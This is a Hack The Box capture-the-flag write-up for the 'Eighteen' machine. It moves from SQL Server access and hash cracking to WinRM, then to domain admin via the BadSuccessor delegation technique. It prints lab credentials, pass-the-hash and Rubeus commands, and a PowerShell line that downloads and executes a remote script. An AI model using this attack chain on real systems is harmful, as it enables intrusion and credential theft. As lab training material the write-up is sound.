HTB Eighteen Writeup
Initial Reconnaissance
Port Scan: nmap -sV -sC

Port 80: Microsoft IIS 10.0 - "Welcome - eighteen.htb"

Port 5985: WinRM service

Port 1433: Microsoft SQL Server 2022 (discovered later)

Initial Access via SQL Server
Step 1: SQL Authentication
bash
mssqlclient.py 'eighteen.htb/kevin:iNa2we6haRj2gaw!@10.10.11.95'
Step 2: Database Enumeration
sql
exec_as_login appdev
use financial_planner
select * from users;
Step 3: Credential Discovery
Found user kevin with PBKDF2 hash:

text
pbkdf2:sha256:600000$uwVXXhAhZucxzWI6$3705cfbc05282de557b4ac175d1d58c5c58e5eb7f2a2a2507a0d5a6d1e8bee09
Cracked password: iloveyou1

Step 4: WinRM Access
bash
evil-winrm -i eighteen.htb -u adam.scott -p 'iloveyou1'
Note: Password reused for adam.scott account

Privilege Escalation
Step 1: Tool Preparation
powershell
# Download BadSuccessor exploit
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/LuemmelSec/Pentest-Tools-Collection/main/tools/ActiveDirectory/BadSuccessor.ps1')
Step 2: Automatic Exploitation
powershell
Import-Module .\BadSuccessor.ps1
BadSuccessor -Mode GetThemHashes -Domain eighteen.htb -Path "OU=Staff,DC=eighteen,DC=htb" -DelegatedAdmin adam.scott -DelegateTarget Administrator
Step 3: Alternative Manual Method
powershell
# Create delegated machine account
BadSuccessor -mode exploit -Path "OU=Staff,DC=eighteen,DC=htb" -Name "attack_dmsa" -DelegatedAdmin "adam.scott" -DelegateTarget "Administrator" -domain "eighteen.htb"

# Perform Kerberoasting
.\Rubeus.exe kerberoast /user:attack_dmsa$ /nowrap
.\Rubeus.exe asktgt /user:attack_dmsa$ /domain:eighteen.htb /nowrap
Administrator Access
bash
evil-winrm -i eighteen.htb -u administrator -H <ADMIN_NTLM_HASH>
Flag Capture
powershell
type C:\Users\Administrator\Desktop\root.txt
Attack Path Summary
SQL Server → Credential theft

Password reuse → Initial shell as adam.scott

BadSuccessor exploit → Domain admin privileges

Administrator shell → Root flag

Key Vulnerabilities
Weak/default SQL credentials

Password reuse across accounts

Windows Server 2025 BadSuccessor vulnerability

Excessive delegation permissions in AD

Tools Used
nmap

mssqlclient.py (Impacket)

evil-winrm

BadSuccessor.ps1

Rubeus.exe

Time: ~2-3 hours
Difficulty: Medium-High
CVE: Windows Server 2025 BadSuccessor vulnerability
